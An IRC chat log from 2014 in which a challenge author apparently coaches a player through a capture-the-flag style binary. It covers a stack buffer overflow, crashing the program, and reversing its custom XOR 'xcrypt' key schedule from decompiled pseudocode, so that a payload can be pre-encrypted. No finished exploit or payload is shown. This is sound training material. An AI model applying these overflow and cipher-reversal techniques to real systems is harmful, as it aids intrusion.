<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[2014-10-10T21:51:11+0100] &lt;recrudesce&gt; hey
</span><span class='line'>[2014-10-10T21:51:18+0100] &lt;recrudesce&gt; so, xcrypt
</span><span class='line'>[2014-10-10T21:51:36+0100] &lt;c0ne&gt; hey
</span><span class='line'>[2014-10-10T21:52:09+0100] &lt;recrudesce&gt; i see that the encryption changes based on the length
</span><span class='line'>[2014-10-10T21:52:28+0100] &lt;recrudesce&gt; so i figure you can send it an ascii string that actually creates a binary
</span><span class='line'>[2014-10-10T21:52:33+0100] &lt;recrudesce&gt; but it wont be suid, so not possible to run it
</span><span class='line'>[2014-10-10T21:53:23+0100] &lt;c0ne&gt; as in use tfc to make a file?
</span><span class='line'>[2014-10-10T21:53:50+0100] &lt;recrudesce&gt; yeah
</span><span class='line'>[2014-10-10T21:54:01+0100] &lt;recrudesce&gt; cos you can work out what ascii chars will relate to the correct hex values
</span><span class='line'>[2014-10-10T21:54:04+0100] &lt;recrudesce&gt; was just a thought
</span><span class='line'>[2014-10-10T21:54:18+0100] &lt;c0ne&gt; hmm it was not intended
</span><span class='line'>[2014-10-10T21:54:36+0100] &lt;recrudesce&gt; so if i needed a binary that was 3161 3161
</span><span class='line'>[2014-10-10T21:54:42+0100] &lt;recrudesce&gt; i can just encrypt a1a1
</span><span class='line'>[2014-10-10T21:54:52+0100] &lt;recrudesce&gt; and it&#39;ll create me a output with hex 3161 3161
</span><span class='line'>[2014-10-10T21:54:58+0100] &lt;recrudesce&gt; just chmod +x it and run it
</span><span class='line'>[2014-10-10T21:55:07+0100] &lt;recrudesce&gt; i guess i could work out what chars would result in the required hex.
</span><span class='line'>[2014-10-10T21:55:12+0100] &lt;recrudesce&gt; then encrypt that to generate the binary
</span><span class='line'>[2014-10-10T21:55:24+0100] &lt;c0ne&gt; could i push you allite bit ahead?
</span><span class='line'>[2014-10-10T21:55:30+0100] &lt;c0ne&gt; into some other road..
</span><span class='line'>[2014-10-10T21:55:35+0100] &lt;recrudesce&gt; but what&#39;s the point, cos i am only able to run that as jason
</span><span class='line'>[2014-10-10T21:55:42+0100] &lt;recrudesce&gt; so, it&#39;s something to do with xcrypt
</span><span class='line'>[2014-10-10T21:55:55+0100] &lt;recrudesce&gt; need to send something to xcrypt to make it create, or execute something
</span><span class='line'>[2014-10-10T21:55:57+0100] &lt;c0ne&gt; its a kinda classic vuln...
</span><span class='line'>[2014-10-10T21:56:11+0100] &lt;recrudesce&gt; so either buffer overflow or formatstr
</span><span class='line'>[2014-10-10T21:56:16+0100] &lt;recrudesce&gt; please dont let it be formatstr
</span><span class='line'>[2014-10-10T21:56:19+0100] &lt;c0ne&gt; first one
</span><span class='line'>[2014-10-10T21:56:22+0100] &lt;c0ne&gt; simple bof
</span><span class='line'>[2014-10-10T21:56:27+0100] &lt;c0ne&gt; but...
</span><span class='line'>[2014-10-10T21:56:55+0100] &lt;c0ne&gt; you need to figure out this xcrypt in order to be able to encrypt your payload
</span><span class='line'>[2014-10-10T21:57:47+0100] &lt;c0ne&gt; also regarding
</span><span class='line'>[2014-10-10T21:57:48+0100] &lt;c0ne&gt; [22:52] &lt;recrudesce&gt; i see that the encryption changes based on the length
</span><span class='line'>[2014-10-10T21:57:55+0100] &lt;c0ne&gt; yes and no...
</span><span class='line'>[2014-10-10T21:58:12+0100] &lt;c0ne&gt; the key will change depending on the length
</span><span class='line'>[2014-10-10T22:03:01+0100] &lt;c0ne&gt; basically it&#39;s a four byte key created from some init values and changes every time after crypting 4 bytes
</span><span class='line'>[2014-10-10T22:03:56+0100] &lt;recrudesce&gt; i can make it  segfault by passing it 1000 a&#39;s
</span><span class='line'>[2014-10-10T22:04:00+0100] &lt;recrudesce&gt; but only on the box
</span><span class='line'>[2014-10-10T22:04:02+0100] &lt;recrudesce&gt; not on my kali
</span><span class='line'>[2014-10-10T22:05:57+0100] &lt;c0ne&gt; 1000 a&#39;s kinda suprisses me
</span><span class='line'>[2014-10-10T22:06:09+0100] &lt;c0ne&gt; since the buffer is bigger
</span><span class='line'>[2014-10-10T22:06:21+0100] &lt;recrudesce&gt; i seg faulted it on 1000 a&#39;s
</span><span class='line'>[2014-10-10T22:06:45+0100] &lt;c0ne&gt; k
</span><span class='line'>[2014-10-10T22:06:51+0100] &lt;c0ne&gt; try something like 5000
</span><span class='line'>[2014-10-10T22:08:26+0100] &lt;recrudesce&gt; ok, i made it crash
</span><span class='line'>[2014-10-10T22:08:43+0100] &lt;recrudesce&gt; 725cce63
</span><span class='line'>[2014-10-10T22:08:48+0100] &lt;recrudesce&gt; but it&#39;s not in the pattern cos it&#39;s encrypting it
</span><span class='line'>[2014-10-10T22:08:56+0100] &lt;c0ne&gt; exactly
</span><span class='line'>[2014-10-10T22:11:35+0100] &lt;recrudesce&gt; you&#39;re evil
</span><span class='line'>[2014-10-10T22:11:45+0100] &lt;c0ne&gt; motherless child
</span><span class='line'>[2014-10-10T22:12:15+0100] &lt;recrudesce&gt; is the original key based off a static init value
</span><span class='line'>[2014-10-10T22:12:17+0100] &lt;recrudesce&gt; or a dynamic one
</span><span class='line'>[2014-10-10T22:12:24+0100] &lt;c0ne&gt; static
</span><span class='line'>[2014-10-10T22:12:26+0100] &lt;c0ne&gt; also
</span><span class='line'>[2014-10-10T22:12:31+0100] &lt;recrudesce&gt; so the first key is always the same
</span><span class='line'>[2014-10-10T22:12:33+0100] &lt;c0ne&gt; xcrypt is one way
</span><span class='line'>[2014-10-10T22:12:49+0100] &lt;c0ne&gt; so it either encrypts or decrypts
</span><span class='line'>[2014-10-10T22:14:10+0100] &lt;c0ne&gt; basicly what is does it
</span><span class='line'>[2014-10-10T22:14:53+0100] &lt;c0ne&gt; creates a 4byte key(dword) crypts a block of 4 bytes(dword) and then changes the key based on another static value
</span><span class='line'>[2014-10-10T22:15:18+0100] &lt;c0ne&gt; and its keeps changing for every loop round
</span><span class='line'>[2014-10-10T22:15:47+0100] &lt;recrudesce&gt; so essentially the key is the same on first loop
</span><span class='line'>[2014-10-10T22:15:52+0100] &lt;recrudesce&gt; and same on 2nd loop ?
</span><span class='line'>[2014-10-10T22:15:56+0100] &lt;c0ne&gt; also on the next
</span><span class='line'>[2014-10-10T22:16:00+0100] &lt;c0ne&gt; and so on...
</span><span class='line'>[2014-10-10T22:16:06+0100] &lt;recrudesce&gt; so no matter what i send it length wise, the 1st key is ALWAYS the same
</span><span class='line'>[2014-10-10T22:16:09+0100] &lt;recrudesce&gt; and so is the 2nd key
</span><span class='line'>[2014-10-10T22:16:12+0100] &lt;c0ne&gt; its a simple math mutation
</span><span class='line'>[2014-10-10T22:16:21+0100] &lt;recrudesce&gt; gotta work out how you generate the 2nd key
</span><span class='line'>[2014-10-10T22:16:27+0100] &lt;recrudesce&gt; work out what the first key is too
</span><span class='line'>[2014-10-10T22:16:41+0100] &lt;c0ne&gt; there is only one key
</span><span class='line'>[2014-10-10T22:16:41+0100] &lt;recrudesce&gt; then you can work out what the algorithm is to generate the keys
</span><span class='line'>[2014-10-10T22:16:47+0100] &lt;recrudesce&gt; yeah, but you mutate it
</span><span class='line'>[2014-10-10T22:16:53+0100] &lt;c0ne&gt; thats exactly what you need to do
</span><span class='line'>[2014-10-10T22:17:16+0100] &lt;c0ne&gt; see how the key is build and mutates
</span><span class='line'>[2014-10-10T22:18:28+0100] &lt;recrudesce&gt; v3 is the key
</span><span class='line'>[2014-10-10T22:18:35+0100] &lt;recrudesce&gt; in pseudo-c
</span><span class='line'>[2014-10-10T22:18:49+0100] &lt;recrudesce&gt; v3 = -367349345
</span><span class='line'>[2014-10-10T22:19:00+0100] &lt;c0ne&gt; make it hex please
</span><span class='line'>[2014-10-10T22:20:52+0100] &lt;recrudesce&gt; -0x15E54E61
</span><span class='line'>[2014-10-10T22:21:24+0100] &lt;c0ne&gt; yeah i just checked it
</span><span class='line'>[2014-10-10T22:21:30+0100] &lt;c0ne&gt; its the init value indeed
</span><span class='line'>[2014-10-10T22:21:47+0100] &lt;recrudesce&gt; ok, so the first key is 0x15E54E61 ?
</span><span class='line'>[2014-10-10T22:21:53+0100] &lt;recrudesce&gt; represented as an unsigned int
</span><span class='line'>[2014-10-10T22:21:58+0100] &lt;c0ne&gt; no
</span><span class='line'>[2014-10-10T22:22:05+0100] &lt;c0ne&gt; unsigned indeed
</span><span class='line'>[2014-10-10T22:22:11+0100] &lt;c0ne&gt; you show signed now
</span><span class='line'>[2014-10-10T22:22:57+0100] &lt;recrudesce&gt; ah, so signed -367349345 (15E54E61) is EA1AB19F unsigned ?
</span><span class='line'>[2014-10-10T22:23:04+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:23:06+0100] &lt;c0ne&gt; in ida
</span><span class='line'>[2014-10-10T22:23:09+0100] &lt;c0ne&gt; press h
</span><span class='line'>[2014-10-10T22:23:16+0100] &lt;c0ne&gt; when the value selected iirc
</span><span class='line'>[2014-10-10T22:24:48+0100] &lt;recrudesce&gt; but it shows 3927617951, not -367349345
</span><span class='line'>[2014-10-10T22:24:54+0100] &lt;recrudesce&gt; or am i being stupid ?
</span><span class='line'>[2014-10-10T22:25:05+0100] &lt;c0ne&gt; and when you press h again
</span><span class='line'>[2014-10-10T22:25:19+0100] &lt;recrudesce&gt; EA1AB19F
</span><span class='line'>[2014-10-10T22:25:24+0100] &lt;recrudesce&gt; but why is the signed different ?
</span><span class='line'>[2014-10-10T22:26:00+0100] &lt;c0ne&gt; it isnt
</span><span class='line'>[2014-10-10T22:26:05+0100] &lt;c0ne&gt; its the same value
</span><span class='line'>[2014-10-10T22:26:26+0100] &lt;recrudesce&gt; ok, i&#39;m confused
</span><span class='line'>[2014-10-10T22:26:37+0100] &lt;recrudesce&gt; in decompiled it shows as -367349345
</span><span class='line'>[2014-10-10T22:26:38+0100] &lt;c0ne&gt; open win calc
</span><span class='line'>[2014-10-10T22:26:52+0100] &lt;c0ne&gt; trow -367349345 in
</span><span class='line'>[2014-10-10T22:26:57+0100] &lt;c0ne&gt; and switch to hex
</span><span class='line'>[2014-10-10T22:27:03+0100] &lt;c0ne&gt; you will see
</span><span class='line'>[2014-10-10T22:27:22+0100] &lt;recrudesce&gt; FFFFFFFEA1AB19F
</span><span class='line'>[2014-10-10T22:27:30+0100] &lt;c0ne&gt; set it to dword
</span><span class='line'>[2014-10-10T22:27:38+0100] &lt;c0ne&gt; strips the left 32 bits
</span><span class='line'>[2014-10-10T22:27:40+0100] &lt;recrudesce&gt; ah ok
</span><span class='line'>[2014-10-10T22:27:42+0100] &lt;recrudesce&gt; yeah, sorry
</span><span class='line'>[2014-10-10T22:28:12+0100] &lt;recrudesce&gt; so that&#39;s the key in hex which is used as the key for the first 4 bytes
</span><span class='line'>[2014-10-10T22:28:28+0100] &lt;recrudesce&gt; then something is happening to that hex value to make the next key
</span><span class='line'>[2014-10-10T22:28:30+0100] &lt;c0ne&gt; its the base value indeed
</span><span class='line'>[2014-10-10T22:28:35+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:29:31+0100] &lt;recrudesce&gt; ok, so it looks like you&#39;re putting that value into ebp+ -0Ch
</span><span class='line'>[2014-10-10T22:30:25+0100] &lt;recrudesce&gt; looks like you&#39;re shifting it by 8
</span><span class='line'>[2014-10-10T22:30:37+0100] &lt;recrudesce&gt; possibly ?
</span><span class='line'>[2014-10-10T22:30:52+0100] &lt;c0ne&gt; more like shifting it by 1 , 8 times
</span><span class='line'>[2014-10-10T22:31:21+0100] &lt;recrudesce&gt; what&#39;s the difference between shifting it by 1 8 times or shifting it by 8
</span><span class='line'>[2014-10-10T22:32:42+0100] &lt;c0ne&gt; a2 &gt;&gt; 2
</span><span class='line'>[2014-10-10T22:32:48+0100] &lt;c0ne&gt; is the same as
</span><span class='line'>[2014-10-10T22:32:52+0100] &lt;c0ne&gt; a2 / 4
</span><span class='line'>[2014-10-10T22:33:09+0100] &lt;recrudesce&gt; ok
</span><span class='line'>[2014-10-10T22:35:15+0100] &lt;recrudesce&gt; bitwise operations
</span><span class='line'>[2014-10-10T22:35:24+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:37:29+0100] &lt;recrudesce&gt; so this key, is it used as hex ?
</span><span class='line'>[2014-10-10T22:37:36+0100] &lt;recrudesce&gt; or converted to something before use ?
</span><span class='line'>[2014-10-10T22:38:28+0100] &lt;c0ne&gt; hex is only a presentation
</span><span class='line'>[2014-10-10T22:38:41+0100] &lt;c0ne&gt; if you get me?
</span><span class='line'>[2014-10-10T22:38:46+0100] &lt;recrudesce&gt; yeah
</span><span class='line'>[2014-10-10T22:38:58+0100] &lt;recrudesce&gt; i&#39;m just trying to work out how this xcrypt works
</span><span class='line'>[2014-10-10T22:38:59+0100] &lt;c0ne&gt; its 32 bits value
</span><span class='line'>[2014-10-10T22:40:14+0100] &lt;c0ne&gt; in assembly you cant realy determ how the value is intended
</span><span class='line'>[2014-10-10T22:40:31+0100] &lt;c0ne&gt; signed or unsigned
</span><span class='line'>[2014-10-10T22:40:45+0100] &lt;c0ne&gt; ah signed value ranges from 0 till 80000000
</span><span class='line'>[2014-10-10T22:41:00+0100] &lt;c0ne&gt; where a unsigned ranges from 0 to ffffffff
</span><span class='line'>[2014-10-10T22:42:59+0100] &lt;recrudesce&gt; i&#39;m still trying to fathom out this xcrypt func
</span><span class='line'>[2014-10-10T22:43:06+0100] &lt;c0ne&gt; normally the code kinda tells you how the value was intended
</span><span class='line'>[2014-10-10T22:43:10+0100] &lt;recrudesce&gt; so it&#39;s taking file size, dividing by 4
</span><span class='line'>[2014-10-10T22:43:13+0100] &lt;recrudesce&gt; looping that many times
</span><span class='line'>[2014-10-10T22:43:30+0100] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
</span><span class='line'>[2014-10-10T22:43:40+0100] &lt;recrudesce&gt; for ( j = 0; j &lt;= 7; ++j )
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt; {
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       else
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;     }
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;   }
</span><span class='line'>[2014-10-10T22:44:02+0100] &lt;c0ne&gt; hmm dress up you ida abit more
</span><span class='line'>[2014-10-10T22:44:07+0100] &lt;c0ne&gt; for example
</span><span class='line'>[2014-10-10T22:44:21+0100] &lt;c0ne&gt; select a1 and press y
</span><span class='line'>[2014-10-10T22:44:25+0100] &lt;c0ne&gt; and change it to
</span><span class='line'>[2014-10-10T22:44:32+0100] &lt;c0ne&gt; _DWORD *a1
</span><span class='line'>[2014-10-10T22:44:40+0100] &lt;recrudesce&gt; hang on, i need to find a1
</span><span class='line'>[2014-10-10T22:44:53+0100] &lt;c0ne&gt; in the function params
</span><span class='line'>[2014-10-10T22:44:58+0100] &lt;c0ne&gt; int __cdecl xcrypt(_DWORD *a1, unsigned int a2)
</span><span class='line'>[2014-10-10T22:45:13+0100] &lt;recrudesce&gt; my pseudocode is in a file
</span><span class='line'>[2014-10-10T22:45:27+0100] &lt;c0ne&gt; aah that wont help then
</span><span class='line'>[2014-10-10T22:45:31+0100] &lt;recrudesce&gt; ok, now it&#39;s in ida
</span><span class='line'>[2014-10-10T22:45:35+0100] &lt;c0ne&gt; since the rest isnt changed then
</span><span class='line'>[2014-10-10T22:46:07+0100] &lt;recrudesce&gt; ok, so i did that
</span><span class='line'>[2014-10-10T22:46:32+0100] &lt;c0ne&gt; [23:43] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
</span><span class='line'>[2014-10-10T22:46:38+0100] &lt;recrudesce&gt; now shows as a1[1] ^= v3
</span><span class='line'>[2014-10-10T22:46:39+0100] &lt;c0ne&gt; that looks abit better now i think?
</span><span class='line'>[2014-10-10T22:46:40+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:46:46+0100] &lt;c0ne&gt; hmm
</span><span class='line'>[2014-10-10T22:46:57+0100] &lt;c0ne&gt; now shows as a1[1] ^= v3 that a 1? in the array?
</span><span class='line'>[2014-10-10T22:47:06+0100] &lt;recrudesce&gt; sorry, i
</span><span class='line'>[2014-10-10T22:47:11+0100] &lt;c0ne&gt; k
</span><span class='line'>[2014-10-10T22:47:12+0100] &lt;recrudesce&gt; a1[i]
</span><span class='line'>[2014-10-10T22:47:14+0100] &lt;c0ne&gt; i was worried
</span><span class='line'>[2014-10-10T22:47:31+0100] &lt;c0ne&gt; name that v3 key or so
</span><span class='line'>[2014-10-10T22:47:39+0100] &lt;c0ne&gt; select &gt; n ..
</span><span class='line'>[2014-10-10T22:48:03+0100] &lt;recrudesce&gt; name it to &quot;key&quot; ?
</span><span class='line'>[2014-10-10T22:48:11+0100] &lt;c0ne&gt; yeah or whatever
</span><span class='line'>[2014-10-10T22:48:16+0100] &lt;c0ne&gt; origenaly its called k
</span><span class='line'>[2014-10-10T22:48:16+0100] &lt;recrudesce&gt; ok, done
</span><span class='line'>[2014-10-10T22:48:28+0100] &lt;c0ne&gt; make its sometimes easier to read the whole thing
</span><span class='line'>[2014-10-10T22:48:53+0100] &lt;recrudesce&gt; k is already in use it seems
</span><span class='line'>[2014-10-10T22:49:10+0100] &lt;c0ne&gt; then use key :P
</span><span class='line'>[2014-10-10T22:49:15+0100] &lt;recrudesce&gt; yeah, done it
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt; {
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       else
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;     }
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;   }
</span><span class='line'>[2014-10-10T22:49:59+0100] &lt;c0ne&gt; so with the last bit of code stripped
</span><span class='line'>[2014-10-10T22:50:05+0100] &lt;c0ne&gt; its kinda looks simple right?
</span><span class='line'>[2014-10-10T22:50:08+0100] &lt;recrudesce&gt; yup, that&#39;s what i have
</span><span class='line'>[2014-10-10T22:50:34+0100] &lt;c0ne&gt; so for every loop 0..7 it does a math check on the last key value
</span><span class='line'>[2014-10-10T22:50:37+0100] &lt;c0ne&gt; the and 1
</span><span class='line'>[2014-10-10T22:50:50+0100] &lt;c0ne&gt; and so chooses how the mutate the key
</span><span class='line'>[2014-10-10T22:51:28+0100] &lt;c0ne&gt; try porting this into python or what you like
</span><span class='line'>[2014-10-10T22:53:13+0100] &lt;recrudesce&gt; cant i just do this in C and make it echo the keys ?
</span><span class='line'>[2014-10-10T22:53:22+0100] &lt;c0ne&gt; sure
</span><span class='line'>[2014-10-10T22:53:26+0100] &lt;recrudesce&gt; rather than return 0, printf(key) ?
</span><span class='line'>[2014-10-10T22:53:38+0100] &lt;c0ne&gt; but python is just as easy
</span><span class='line'>[2014-10-10T22:53:45+0100] &lt;c0ne&gt; hmm now sure if you want that
</span><span class='line'>[2014-10-10T22:53:51+0100] &lt;c0ne&gt; but yes i think is possible
</span><span class='line'>[2014-10-10T22:54:02+0100] &lt;recrudesce&gt; ok, lets work this through in python
</span><span class='line'>[2014-10-10T22:54:03+0100] &lt;c0ne&gt; but you will flood your screen
</span><span class='line'>[2014-10-10T22:55:32+0100] &lt;recrudesce&gt; ok, so a1 is the content of the file
</span><span class='line'>[2014-10-10T22:55:37+0100] &lt;recrudesce&gt; and a2 is the length of the file ?
</span><span class='line'>[2014-10-10T22:55:38+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:55:41+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:56:56+0100] &lt;recrudesce&gt; ok, so i need to pass my python script a file
</span><span class='line'>[2014-10-10T22:57:01+0100] &lt;recrudesce&gt; get the contents of it
</span><span class='line'>[2014-10-10T22:57:04+0100] &lt;recrudesce&gt; and the length
